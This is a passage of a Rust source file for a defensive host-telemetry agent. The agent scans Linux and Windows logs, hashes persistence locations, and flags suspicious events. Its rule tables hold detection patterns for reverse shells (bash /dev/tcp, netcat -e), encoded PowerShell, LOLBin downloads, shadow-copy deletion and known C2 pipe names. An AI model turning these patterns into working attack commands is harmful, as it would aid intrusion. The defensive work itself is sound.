//! Security telemetry collection and threat detection ("Thanatos"): on
//! Linux, tails this host's security-relevant logs (auth/login, the
//! kernel ring buffer, and systemd unit failures); on Windows, queries
//! the Security and System event logs for an analogous set of signals
//! (failed/successful logons, account creation, privileged group
//! membership changes, service failures, unexpected shutdowns). Either
//! way, each line/event is classified against a fixed, ordered rule
//! table. Deliberately narrow compared to a full EDR/SIEM shipper -- no
//! continuous push telemetry, no eBPF/ETW, no log-file offset tracking.
//! The control plane pulls this on demand (or on its own periodic sweep,
//! see `crates/web/src/thanatos_ops.rs`) and does its own deduplication
//! by content hash, so re-scanning the same tail window repeatedly is
//! harmless, just slightly redundant -- a deliberate simplicity
//! trade-off consistent with every other arsenal in this codebase never
//! needing host-side state files.
//!
//! Output is tab-separated (`severity\tlabel\tsource\traw_line` for a
//! classified event, `fim\t<path>\t<hash>` for a file-integrity watch-list
//! entry, `info\t<message>` for anything else worth surfacing) rather
//! than free text: the control plane needs to parse and persist each
//! matched line as its own row for correlation to work, and `OperationOutput`
//! has no structured variant -- this is the same reasoning Reliquary's and
//! Inquest's listing operations already use `find -printf` tab-separated
//! output for. Identical on both platforms -- the control plane's ingest,
//! correlation, and UI code needs zero changes either way.

use std::net::IpAddr;

use abyssal_agent_protocol::{CommandOutcome, OperationOutput};

use crate::elevation::ElevationState;
#[cfg(unix)]
use crate::process::command_exists;

/// True for a private (RFC 1918), loopback, or link-local address --
/// shared by both platforms' outbound-connection gathering (Phase 8) to
/// filter out ordinary internal/local traffic before it's ever even
/// formatted, let alone classified. `Ipv4Addr::is_private`/`is_loopback`/
/// `is_link_local` are all stable std; IPv6 has no stable-std equivalent
/// for the private (`fc00::/7`, unique local) or link-local (`fe80::/10`)
/// ranges, so those two are checked by hand against the first 16 bits.
fn is_private_or_loopback(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => v4.is_private() || v4.is_loopback() || v4.is_link_local(),
        IpAddr::V6(v6) => {
            v6.is_loopback()
                || (v6.segments()[0] & 0xfe00) == 0xfc00
                || (v6.segments()[0] & 0xffc0) == 0xfe80
        }
    }
}

#[cfg(unix)]
const TAIL_LINES: &str = "500";
#[cfg(unix)]
const JOURNAL_LINES: &str = "200";

/// `(path, source label)` -- tried in order; the first one that's a
/// readable, non-empty file wins. Debian/Ubuntu vs. RHEL/Fedora-family
/// naming, the two layouts flat security logs actually appear under.
#[cfg(unix)]
const LOG_CANDIDATES: &[(&str, &str)] = &[
    ("/var/log/auth.log", "auth.log"),
    ("/var/log/secure", "secure"),
];

/// Same "flat file first" shape as `LOG_CANDIDATES`, for the kernel ring
/// buffer -- `/var/log/kern.log` exists on Debian/Ubuntu by default (RHEL/
/// Fedora fold kernel messages into the journal instead, so there's no
/// equivalent flat-file candidate to add for that family). Independent of
/// the auth sources above: gathered and classified regardless of whether
/// auth.log/secure/journal turned up anything, since OOM-kills and
/// hardware errors are never auth-related.
#[cfg(unix)]
const KERNEL_LOG_CANDIDATES: &[(&str, &str)] = &[("/var/log/kern.log", "kern.log")];

/// Small, fixed set of security-sensitive files hashed on every scan --
/// lightweight file-integrity monitoring, not a general-purpose file
/// scanner. Always hashed regardless of whatever admin-configured
/// `extra_fim_paths` (Phase 7b) also arrive on a given scan -- this is
/// the baseline every host gets, not something an admin can accidentally
/// lose by clearing the configurable list. The agent stays stateless
/// either way; comparison against the last-known hash happens entirely
/// control-plane-side (`repo::thanatos_file_hashes`).
#[cfg(unix)]
const FIM_WATCHLIST: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/ssh/sshd_config",
    // Persistence-sensitive files (M4 Linux parity). Each is a single file the
    // sha256sum pass already handles; the loop emits nothing for a file that
    // doesn't exist, so a normally-absent one (ld.so.preload) simply establishes
    // no baseline until it appears -- at which point its sudden existence is
    // itself the finding.
    "/etc/ld.so.preload", // classic rootkit LD preload; should normally not exist
    "/etc/crontab",       // system crontab
    "/etc/rc.local",      // legacy boot-time persistence
    "/root/.bashrc",      // root shell rc (login persistence)
    "/root/.bash_profile",
    "/root/.profile",
    "/etc/profile", // system-wide shell rc
];

/// A journal source to fall back to when neither flat log candidate
/// above exists or is readable (e.g. a systemd-journal-only host with no
/// rsyslog forwarding configured). `sshd` and `systemd-logind` are real
/// systemd units (`journalctl -u`), but `sudo`/`su` are one-off child
/// processes, not services -- they have no unit at all, so `-u sudo`
/// silently returns nothing. Their PAM messages (including the
/// "authentication failure" line this arsenal's rules match on) are
/// tagged with the syslog identifier `sudo`/`su` instead, which needs
/// `journalctl -t`, a genuinely different flag.
#[cfg(unix)]
enum JournalSource {
    Unit(&'static str),
    Identifier(&'static str),
}

#[cfg(unix)]
const JOURNAL_SOURCES: &[JournalSource] = &[
    JournalSource::Unit("sshd"),
    JournalSource::Identifier("sudo"),
    JournalSource::Identifier("su"),
    JournalSource::Unit("systemd-logind"),
];

/// Windows Security-log event IDs Thanatos watches for (Phase 4 baseline
/// plus Phase 6's broader coverage): failed/successful logons, explicit-
/// credential logons (lateral movement/"runas"), privileged-logon use,
/// account/service/scheduled-task creation and privileged group
/// membership changes, audit-policy tampering, lockouts, and audit-log
/// clearing.
#[cfg(windows)]
const WINDOWS_SECURITY_EVENT_IDS: &[u32] = &[
    4624, 4625, 4648, 4672, 4697, 4698, 4699, 4700, 4701, 4702, 4719, 4720, 4732, 4740, 1102,
    // Account-lifecycle depth (M3): deleted/changed/enabled/disabled, and
    // added-to / removed-from privileged global & universal groups -- the
    // account-tampering signals the Phase-4 set was missing.
    4722, 4725, 4726, 4738, 4728, 4756, 4733, 4757,
    // Kerberos pre-authentication failed -- a failed-logon signal on domain hosts.
    4771,
    // 4688 process creation. Formerly excluded as too high-volume for the fixed
    // 200-event window; now affordable because the scan reads only events newer
    // than the per-channel high-water mark (`channel_offsets`). It carries no
    // blanket EventID rule -- only a command line matching a LOLBin/obfuscation
    // pattern in `RULES` is ever persisted, the "specific signal, not the whole
    // category" approach process command lines already use.
    4688,
];

/// Windows System-log signals: repeated service-start failures/hangs and
/// an unexpected shutdown -- the closest analog available from the event
/// log alone to Linux's "systemd unit failed"/kernel-crash rules. Windows
/// has no OOM killer, so there's no direct analog to that specific rule;
/// 6008 (unexpected shutdown) is the nearest "something crashed hard"
/// signal.
#[cfg(windows)]
const WINDOWS_SYSTEM_EVENT_IDS: &[u32] = &[6008, 7000, 7009, 7011];

/// Additional log channels beyond Security/System (Phase 6b), each
/// populated only if the host's audit policy actually enables it --
/// same "best-effort, silently nothing if absent" caveat 4688 process-
/// creation auditing already carries. `Microsoft-Windows-PowerShell/
/// Operational` needs Script Block Logging turned on via policy (off by
/// default); `Microsoft-Windows-Windows Defender/Operational` is only
/// populated if Defender is the active AV (usually is, by default,
/// unless replaced by third-party AV). Sysmon-sourced events are
/// deliberately excluded -- Sysmon isn't installed by default on any
/// Windows edition, a materially bigger assumption than "this built-in
/// audit policy happens to be enabled," consistent with the "no eBPF"
/// line already drawn for Linux.
#[cfg(windows)]
const WINDOWS_EXTRA_CHANNELS: &[(&str, &str, &[u32])] = &[
    (
        "Microsoft-Windows-PowerShell/Operational",
        "powershell",
        &[4104],
    ),
    (
        "Microsoft-Windows-Windows Defender/Operational",
        "defender",
        &[1116, 5001],
    ),
    // Sysmon: opt-in, never assumed -- the channel exists only if an operator
    // has deployed Sysmon, in which case nothing fires until it does. IDs 8
    // (CreateRemoteThread) and 25 (process tampering) carry blanket rules; 1
    // (process create) is high-volume and now affordable via offset tracking,
    // classified only by the shared LOLBin/obfuscation command-line rules (its
    // message carries the full CommandLine), same as native 4688. 17/18 (named
    // pipe created/connected, M1) carry no blanket rule either -- only a pipe
    // whose name matches a known-C2 pattern (`MULTI_RULES`/pipe rules) is
    // flagged, so benign pipes never produce noise. ID 10 (ProcessAccess) is
    // NOT collected via this generic channel -- it's handled by a dedicated
    // LSASS-targeted query (`windows_lsass_access_script`) so the common,
    // benign case (every tool that opens a handle to a process) never floods
    // the scan; only suspicious access to lsass.exe is emitted.
    (
        "Microsoft-Windows-Sysmon/Operational",
        "sysmon",
        &[1, 8, 17, 18, 25],
    ),
];

/// One Windows FIM watch item: a stable identifier (used as the `path`
/// column in `thanatos_file_hashes` -- not necessarily a real filesystem
/// path, the registry/local-group entries below are synthetic
/// identifiers instead) plus the PowerShell expression that captures its
/// current content as text. Every item is hashed the same uniform way
/// (`windows_fim_hash_script`, below) regardless of whether the content
/// came from a file, the registry, or a group membership list -- unlike
/// Phase 4's single hosts-file item, which used `Get-FileHash` directly
/// since a file was the only kind of item that existed yet.
#[cfg(windows)]
struct WindowsFimItem {
    identifier: &'static str,
    capture_expr: &'static str,
}

/// Mirrors Linux's `FIM_WATCHLIST`, broadened in Phase 6 beyond the
/// single hosts-file item Phase 4 shipped. Windows has no single
/// flat-file analog to /etc/passwd or /etc/sudoers -- local account
/// state lives in the binary, normally-locked SAM database, not a
/// hashable text file -- so the other two items below are the closest
/// real equivalents instead: a machine-wide persistence location, and a
/// privileged-group membership snapshot.
#[cfg(windows)]
const WINDOWS_FIM_WATCHLIST: &[WindowsFimItem] = &[
    WindowsFimItem {
        identifier: r"C:\Windows\System32\drivers\etc\hosts",
        capture_expr: "(Get-Content -Raw -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -ErrorAction SilentlyContinue)",
    },
    // Machine-wide (HKLM) Run/RunOnce, and -- separately below -- the Run/
    // RunOnce of every *currently-loaded* user hive under HKEY_USERS. The
    // agent/service runs as `LocalSystem`, so a plain `HKCU:` only ever sees
    // LocalSystem's own never-used-for-persistence profile; a real user's keys
    // live under `HKEY_USERS\<SID>` while that user is logged on. Covering
    // loaded hives catches the realistic case (persistence planted in an
    // interactive/service user's profile) without the substantially more
    // fragile work of enumerating and loading every logged-off user's offline
    // `NTUSER.DAT` -- that remains a documented gap, not silently dropped.
    // `Sort-Object` guards against registry enumeration order not being a
    // stable property to hash across scans the way whole-file content is -- an
    // unsorted hash risks a spurious "changed" finding from nothing but
    // reordering, not a real change.
    WindowsFimItem {
        identifier: r"HKLM\...\CurrentVersion\Run(Once)",
        capture_expr: "(@('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', \
             'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce') | ForEach-Object { \
             $key = $_; Get-ItemProperty -Path $key -ErrorAction SilentlyContinue } | \
             ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
             ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
    },
    WindowsFimItem {
        // Per-user Run/RunOnce for every loaded user hive. SID-prefixed so a
        // key appearing/changing under any logged-on user's profile alters the
        // hash. `.DEFAULT` and the three well-known service SIDs
        // (S-1-5-18/19/20) and the paired `_Classes` hives are excluded as
        // noise; whole thing sorted for a stable cross-scan hash.
        identifier: r"HKU\<loaded>\...\CurrentVersion\Run(Once)",
        capture_expr: "(Get-ChildItem Registry::HKEY_USERS -ErrorAction SilentlyContinue | \
             Where-Object { $_.PSChildName -notmatch '_Classes$' -and \
               $_.PSChildName -notin @('.DEFAULT','S-1-5-18','S-1-5-19','S-1-5-20') } | \
             ForEach-Object { $sid = $_.PSChildName; \
               @(\"Registry::HKEY_USERS\\$sid\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \
                 \"Registry::HKEY_USERS\\$sid\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\") | \
               ForEach-Object { Get-ItemProperty -Path $_ -ErrorAction SilentlyContinue } | \
               ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
               ForEach-Object { \"$sid|$($_.Name)=$($_.Value)\" } } | Sort-Object)",
    },
    WindowsFimItem {
        identifier: "local-group:Administrators",
        capture_expr: "(Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | \
             Select-Object -ExpandProperty Name | Sort-Object)",
    },
    // ---- Persistence & configuration surfaces (Windows EDR depth). Each is a
    // hashed snapshot of a place attackers plant persistence or weaken
    // security; a change from the per-host baseline raises the same FIM-change
    // finding the items above do. State/volatile fields are deliberately
    // excluded (service State, task State) so a running service/task doesn't
    // produce a spurious "changed" every scan -- only the security-relevant
    // shape (what runs, from where, as whom) is hashed.
    WindowsFimItem {
        // Every service's binary path, start mode and logon account -- catches
        // a newly-installed service, a hijacked binary path, or a start-mode
        // flip to Auto.
        identifier: "services:config",
        capture_expr: "(Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | \
             ForEach-Object { \"$($_.Name)|$($_.PathName)|$($_.StartMode)|$($_.StartName)\" } | Sort-Object)",
    },
    WindowsFimItem {
        // Scheduled tasks by path/name, the account they run as, and what they
        // execute -- a mainstream persistence mechanism.
        identifier: "scheduled-tasks",
        capture_expr: "(Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object { \
             $actions = ($_.Actions | ForEach-Object { \"$($_.Execute) $($_.Arguments)\" }) -join ';'; \
             \"$($_.TaskPath)$($_.TaskName)|$($_.Principal.UserId)|$actions\" } | Sort-Object)",
    },
    WindowsFimItem {
        // WMI event-subscription persistence (__EventFilter / __EventConsumer /
        // binding) -- fileless persistence with, until now, zero coverage. On a
        // clean host this captures nothing; any appearance/change alerts.
        identifier: "wmi-persistence",
        capture_expr: "(@('__EventFilter','__EventConsumer','__FilterToConsumerBinding') | ForEach-Object { \
             $cls = $_; Get-CimInstance -Namespace 'root/subscription' -ClassName $cls -ErrorAction SilentlyContinue | \
             ForEach-Object { \"$cls|$($_.Name)|$($_.Query)$($_.CommandLineTemplate)$($_.ScriptText)\" } } | Sort-Object)",
    },
    WindowsFimItem {
        // Firewall profile state -- catches a profile being disabled or its
        // default inbound/outbound action being loosened.
        identifier: "firewall-profiles",
        capture_expr: "(Get-NetFirewallProfile -ErrorAction SilentlyContinue | ForEach-Object { \
             \"$($_.Name)|$($_.Enabled)|$($_.DefaultInboundAction)|$($_.DefaultOutboundAction)\" } | Sort-Object)",
    },
    WindowsFimItem {
        // Winlogon autostart values (Shell/Userinit/Taskman/AppSetup) -- classic
        // logon-persistence ASEP.
        identifier: r"HKLM\...\Winlogon",
        capture_expr: "(Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -ErrorAction SilentlyContinue | \
             ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -in @('Shell','Userinit','Taskman','AppSetup') } | \
             ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
    },
    WindowsFimItem {
        // Image File Execution Options debugger hijacks -- a per-executable
        // `Debugger` value silently launches an attacker binary in place of the
        // real one.
        identifier: r"HKLM\...\Image File Execution Options",
        capture_expr: "(Get-ChildItem -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -ErrorAction SilentlyContinue | \
             ForEach-Object { $dbg = (Get-ItemProperty -Path $_.PSPath -Name Debugger -ErrorAction SilentlyContinue).Debugger; \
             if ($dbg) { \"$($_.PSChildName)=$dbg\" } } | Sort-Object)",
    },
    WindowsFimItem {
        // AppInit_DLLs -- a DLL loaded into nearly every process at startup.
        identifier: r"HKLM\...\Windows\AppInit_DLLs",
        capture_expr: "(Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows' -ErrorAction SilentlyContinue | \
             ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -in @('AppInit_DLLs','LoadAppInit_DLLs') } | \
             ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
    },
    WindowsFimItem {
        // Windows Defender exclusions (paths/processes/extensions) -- adding an
        // exclusion is a classic evasion, so any change from baseline alerts.
        // Empty on hosts without Defender (nothing captured, nothing to hash).
        identifier: "defender-exclusions",
        capture_expr: "(Get-MpPreference -ErrorAction SilentlyContinue | ForEach-Object { \
             'ExclusionPath=' + (($_.ExclusionPath | Sort-Object) -join ';'); \
             'ExclusionProcess=' + (($_.ExclusionProcess | Sort-Object) -join ';'); \
             'ExclusionExtension=' + (($_.ExclusionExtension | Sort-Object) -join ';') })",
    },
    WindowsFimItem {
        // Startup folders (all-users + every user profile's) -- a new file
        // appearing here is a mainstream, low-tech persistence mechanism. File
        // name + size per entry; a change (add/remove/replace) alters the hash.
        identifier: "startup-folders",
        capture_expr: "(@($env:ProgramData + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup') + \
             @(Get-ChildItem 'C:\\Users' -Directory -ErrorAction SilentlyContinue | \
               ForEach-Object { $_.FullName + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' }) | \
             ForEach-Object { Get-ChildItem -Path $_ -File -ErrorAction SilentlyContinue } | \
             ForEach-Object { \"$($_.FullName)|$($_.Length)\" } | Sort-Object)",
    },
    WindowsFimItem {
        // LSA Security/Authentication/Notification packages -- DLLs the LSA
        // loads at boot (SSP/AP/notification-package persistence & credential
        // theft). REG_MULTI_SZ values flattened; any added package alerts.
        identifier: r"HKLM\...\Lsa packages",
        capture_expr: "((Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -ErrorAction SilentlyContinue | \
             ForEach-Object { $_.PSObject.Properties } | \
             Where-Object { $_.Name -in @('Security Packages','Authentication Packages','Notification Packages') } | \
             ForEach-Object { \"$($_.Name)=$(($_.Value) -join ',')\" }) | Sort-Object)",
    },
    WindowsFimItem {
        // Netsh helper DLLs -- a DLL registered here loads into every `netsh`
        // invocation, a quiet persistence/proxied-execution spot.
        identifier: r"HKLM\...\Netsh helpers",
        capture_expr: "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Netsh' -ErrorAction SilentlyContinue | \
             ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
             ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
    },
];

/// Wraps a PowerShell expression that yields either a single string or
/// an array of strings, joins/hashes it in .NET directly (SHA-256, hex,
/// lowercased to match Linux's `sha256sum` convention), and prints just
/// the hash -- one uniform hashing step shared by every
/// `WindowsFimItem`, whatever kind of content it captures. Prints
/// nothing (not even an empty line) when the captured content is empty/
/// unavailable, so the caller can tell "nothing to hash" apart from "an
/// all-zero-length file" without a separate existence check.
#[cfg(windows)]
fn windows_fim_hash_script(capture_expr: &str) -> String {
    format!(
        "$content = {capture_expr}; \
         if ($content) {{ \
           $joined = ($content -join \"`n\"); \
           $bytes = [System.Text.Encoding]::UTF8.GetBytes($joined); \
           $hashBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes); \
           Write-Output ([System.BitConverter]::ToString($hashBytes).Replace('-', '').ToLower()) \
         }}"
    )
}

/// Ordered, first-match-wins classification rules: (substring, severity,
/// label). Order is load-bearing -- specific patterns before general ones,
/// e.g. "Failed password for invalid user" before the plain "Failed
/// password for", so an invalid-user attempt is never under-classified as
/// an ordinary failed login. `severity` is always `low`/`medium`/`high`
/// here -- `critical` is reserved for the control plane's own correlation
/// findings (see the `AgentOperation::ScanSecurityEvents` doc comment).
const RULES: &[(&str, &str, &str)] = &[
    (
        "Failed password for invalid user",
        "high",
        "SSH invalid-user login attempt",
    ),
    ("Failed password for", "medium", "SSH failed login"),
    (
        "Invalid user",
        "medium",
        "SSH login attempt for nonexistent user",
    ),
    (
        "Accepted publickey for",
        "low",
        "SSH successful login (key)",
    ),
    (
        "Accepted password for",
        "low",
        "SSH successful login (password)",
    ),
    (
        "session opened for user root",
        "high",
        "Root session opened",
    ),
    ("session opened for user", "low", "Session opened"),
    ("authentication failure", "high", "Authentication failure"),
    ("FAILED su", "high", "su authentication failure"),
    ("sudo:", "low", "Sudo activity"),
    ("password changed", "medium", "Password changed"),
    ("new group:", "medium", "Group created"),
    ("new user:", "medium", "User created"),
    (
        "Connection closed",
        "low",
        "SSH connection closed before authentication",
    ),
    ("segfault", "medium", "Process segfault"),
    ("New session", "low", "New login session"),
    // Kernel ring buffer (source "kern.log"/"kernel") and systemd unit
    // failures (source "systemd") -- added alongside the auth-oriented
    // rules above rather than in a separate table, since classification
    // is one global first-match-wins pass regardless of which source a
    // line came from.
    ("invoked oom-killer", "high", "OOM killer invoked"),
    (
        "Out of memory: Killed process",
        "high",
        "OOM killer invoked",
    ),
    (
        "Machine Check Event",
        "high",
        "Hardware machine-check event",
    ),
    ("I/O error", "medium", "Disk I/O error"),
    // `systemctl --failed`'s default column layout always repeats the
    // ACTIVE and SUB state back to back for a failed unit ("... loaded
    // failed failed ..."), a distinctive enough pair of words that it's
    // very unlikely to appear in an unrelated log line.
    ("failed failed", "medium", "systemd unit failed"),
    // ---- Process command-line signals (Phase 7). Matched against every
    // running process's own command line (source "process"), not a
    // process-list diff -- see `scan_security_events`'s own comment on
    // why. Deliberately a small, high-confidence set: constructs that
    // are essentially never legitimate rather than broad heuristics that
    // would false-positive on ordinary admin/scripting activity.
    (
        "/dev/tcp/",
        "high",
        "Possible reverse shell (bash /dev/tcp construct)",
    ),
    ("nc -e", "high", "Possible reverse shell (netcat -e)"),
    (
        "ncat --exec",
        "high",
        "Possible reverse shell (ncat --exec)",
    ),
    ("ncat -e", "high", "Possible reverse shell (ncat -e)"),
    // ---- Windows Security/System event log signals (Phase 4). Matched
    // on the `EventID=<n>` marker the Windows scan path embeds in each
    // line, never on the event's own message text: that text is
    // localized per the host's display language, so an English-wording
    // substring rule would silently stop matching on a non-English
    // host, while the numeric event ID is stable across every locale.
    // 4688 (process creation, audited only if the host's policy enables
    // it) is deliberately NOT classified by event ID at all -- on a host
    // where it's enabled it fires on every process launch, almost all
    // benign, and this arsenal only ever persists rows a rule actually
    // matched. Instead, only a command line containing a known
    // obfuscation/LOLBin pattern is flagged below, the same
    // "specific signal, not the whole category" approach
    // `segfault`/`invoked oom-killer` already take on the Linux side.
    ("EventID=4625", "high", "Windows failed logon"),
    ("EventID=4624", "low", "Windows successful logon"),
    ("EventID=4720", "medium", "Windows user account created"),
    (
        "EventID=4732",
        "high",
        "Windows account added to a security group",
    ),
    (
        "-EncodedCommand",
        "high",
        "Suspicious encoded PowerShell command",
    ),
    (
        "FromBase64String",
        "high",
        "Suspicious base64-decode-and-execute pattern",
    ),
    ("EventID=6008", "high", "Unexpected system shutdown"),
    ("EventID=7000", "medium", "Windows service failed to start"),
    ("EventID=7009", "medium", "Windows service failed to start"),
    ("EventID=7011", "medium", "Windows service control timeout"),
    // ---- Phase 6: broader Windows Security-log coverage, same
    // EventID-marker-matching reasoning as above. `-EncodedCommand`/
    // `FromBase64String` above already cover event 4104 (PowerShell
    // script block logging, `WINDOWS_EXTRA_CHANNELS`) for free -- a
    // logged script block containing either pattern matches the same
    // rule regardless of which log line it came from, so no separate
    // 4104 rule is needed.
    (
        "EventID=4648",
        "high",
        "Explicit-credential logon (possible lateral movement)",
    ),
    (
        "EventID=4672",
        "medium",
        "Privileged logon (admin/SYSTEM-level)",
    ),
    ("EventID=4697", "high", "Windows service installed"),
    ("EventID=4698", "medium", "Scheduled task created"),
    ("EventID=4699", "medium", "Scheduled task deleted"),
    ("EventID=4700", "medium", "Scheduled task enabled"),
    ("EventID=4701", "medium", "Scheduled task disabled"),
    ("EventID=4702", "medium", "Scheduled task updated"),
    (
        "EventID=4719",
        "high",
        "System audit policy changed (possible log tampering)",
    ),
    ("EventID=4740", "low", "Windows account locked out"),
    (
        "EventID=1102",
        "high",
        "Windows audit log was cleared (anti-forensics)",
    ),
    // ---- Account-lifecycle + Kerberos depth (M3). Same EventID-marker
    // matching. Adding a member to a privileged global/universal group is
    // treated as high, matching the existing local-group rule (4732).
    ("EventID=4722", "medium", "Windows user account enabled"),
    ("EventID=4725", "low", "Windows user account disabled"),
    ("EventID=4726", "medium", "Windows user account deleted"),
    ("EventID=4738", "low", "Windows user account changed"),
    (
        "EventID=4728",
        "high",
        "Account added to a privileged global group",
    ),
    (
        "EventID=4756",
        "high",
        "Account added to a privileged universal group",
    ),
    ("EventID=4733", "low", "Account removed from a local group"),
    (
        "EventID=4757",
        "low",
        "Account removed from a universal group",
    ),
    (
        "EventID=4771",
        "medium",
        "Kerberos pre-authentication failed",
    ),
    // Windows Defender (`WINDOWS_EXTRA_CHANNELS`) -- populated only if
    // Defender is the active AV.
    ("EventID=1116", "high", "Windows Defender detected malware"),
    (
        "EventID=5001",
        "high",
        "Windows Defender real-time protection disabled",
    ),
    // Sysmon (M4, source "sysmon", opt-in). The trailing tab is significant:
    // the line is `EventID=<n>\t...`, and matching `EventID=8\t` (not the bare
    // `EventID=8`) keeps a single-digit Sysmon ID from also matching a 4-digit
    // Security ID like 1102/1116 by substring.
    (
        "EventID=8\t",
        "high",
        "Possible process injection (Sysmon CreateRemoteThread)",
    ),
    (
        "EventID=25\t",
        "high",
        "Possible process tampering/hollowing (Sysmon)",
    ),
    // Known command-and-control named-pipe names (Sysmon 17/18, M1). These are
    // default pipe-name patterns baked into offensive C2 frameworks (Cobalt
    // Strike `msagent_`/`postex_`/`MSSE-`, older `demoagent_`) -- distinctive
    // enough that a bare substring match is high-confidence and won't collide
    // with the legitimate named pipes Windows and applications create.
    ("msagent_", "high", "Known command-and-control named pipe"),
    ("postex_", "high", "Known command-and-control named pipe"),
    ("MSSE-", "high", "Known command-and-control named pipe"),
    ("demoagent_", "high", "Known command-and-control named pipe"),
    // NB: outbound connections to reverse-shell/C2 ports (source
    // "network-outbound", both platforms) are NOT in this static table --
    // they're matched by `classify_line` against the operator-configurable
    // `THANATOS_C2_PORTS` set, by exact numeric port. Kept out of the
    // substring table deliberately: a substring needle like `remote_port=1337`
    // also matches port 13370, and the port set is meant to be tunable without
    // a rebuild. It stays a short, high-confidence list rather than a broad
    // "any unusual port" heuristic -- brand-new external IPs/ports are
    // ordinary traffic (CDN edges, load-balanced pools), unlike a new
    // *listening* port. Private/loopback/link-local destinations are filtered
    // (`is_private_or_loopback`) before a line is ever formatted.
];

/// Command-line LOLBin rules requiring **all** listed substrings to be present
/// (M1). Matched case-insensitively against a lowercased copy of the line, so
/// `VSSADMIN Delete Shadows` matches the same rule as `vssadmin delete
/// shadows`. A single substring would be far too broad for these (`certutil`,
/// `reg`, `net`, `delete` all have countless benign uses) -- it's the
/// *combination* that's the signal, so each rule names every piece that must
/// co-occur. Every needle here must be lowercase. First-match-wins, after the
/// single-substring `RULES` table.
const MULTI_RULES: &[(&[&str], &str, &str)] = &[
    (
        &["certutil", "urlcache"],
        "high",
        "Ingress tool transfer via certutil",
    ),
    (
        &["bitsadmin", "/transfer"],
        "high",
        "Download via bitsadmin",
    ),
    (&["mshta", "http"], "high", "Proxied execution via mshta"),
    (
        &["mshta", "vbscript:"],
        "high",
        "Proxied execution via mshta",
    ),
    (
        &["regsvr32", "scrobj"],
        "high",
        "Proxied execution via regsvr32",
    ),
    (
        &["rundll32", "javascript:"],
        "high",
        "Proxied execution via rundll32",
    ),
    (
        &["vssadmin", "delete", "shadows"],
        "high",
        "Shadow copy / backup deletion (ransomware precursor)",
    ),
    (
        &["wmic", "shadowcopy", "delete"],
        "high",
        "Shadow copy / backup deletion (ransomware precursor)",
    ),
    (
        &["wbadmin", "delete", "catalog"],
        "high",
        "Shadow copy / backup deletion (ransomware precursor)",
    ),
    (
        &["bcdedit", "recoveryenabled", "no"],
        "high",
        "Shadow copy / backup deletion (ransomware precursor)",
    ),
    (
        &["wevtutil", "cl "],
        "high",
        "Event log cleared via wevtutil",
    ),
    (
        &["reg", "add", "currentversion\\run"],
        "medium",
        "Run-key persistence added via reg.exe",
    ),
    (
        &["net", "user", "/add"],
        "medium",
        "Local account created via net.exe",
    ),
];

fn classify(line: &str) -> Option<(&'static str, &'static str)> {
    if let Some((_, severity, label)) = RULES.iter().find(|(needle, _, _)| line.contains(needle)) {
        return Some((*severity, *label));
    }
    // Multi-substring LOLBin rules, case-insensitive. Only lowercased once, and
    // only if nothing in the (case-sensitive, EventID-anchored) RULES matched.
    let lowered = line.to_ascii_lowercase();
    MULTI_RULES
        .iter()
        .find(|(needles, _, _)| needles.iter().all(|n| lowered.contains(n)))
        .map(|(_, severity, label)| (*severity, *label))
}

/// Classifies one gathered line. Event-log / command-line / log content goes
/// through the static `RULES` substring table first; an outbound-network line
/// that nothing in the table matched is then checked against the
/// operator-configurable C2 port set by **exact numeric port** (so port 13370
/// never trips a rule meant for 1337, which prefix-substring matching did).
/// Shared by both platforms' scan loops.
fn classify_line(
    source: &str,
    line: &str,
    c2_ports: &[u16],
) -> Option<(&'static str, &'static str)> {
    if let Some(hit) = classify(line) {
        return Some(hit);
    }
    if source == "network-outbound"
        && let Some(port) = outbound_remote_port(line)
        && c2_ports.contains(&port)
    {
        return Some((
            "high",
            "Outbound connection to a flagged C2/reverse-shell port",
        ));
    }
    None
}

/// Pulls the numeric remote port out of a `remote_port=<n>\tremote_addr=...`
/// outbound line. Anchored on the `remote_port=` prefix and parsed as a whole
/// `u16`, so matching is exact, never a substring of a longer port number.
fn outbound_remote_port(line: &str) -> Option<u16> {
    line.strip_prefix("remote_port=")
        .and_then(|rest| rest.split('\t').next())
        .and_then(|port| port.parse::<u16>().ok())
}

// ---- Process ancestry (M1) ------------------------------------------------
// Pure, testable parent->child chain classification. Compiled on Windows (the
// only caller) and under test (so it's exercised on the host target too).

/// Productivity apps and browsers that should essentially never spawn a shell
/// or script host -- a child that does is the classic phishing/exploit
/// execution chain. Lowercase, for case-insensitive comparison.
#[cfg(any(windows, test))]
const ANCESTRY_DOC_PARENTS: &[&str] = &[
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "msaccess.exe",
    "mspub.exe",
    "visio.exe",
    "onenote.exe",
    "chrome.exe",
    "firefox.exe",
    "msedge.exe",
    "iexplore.exe",
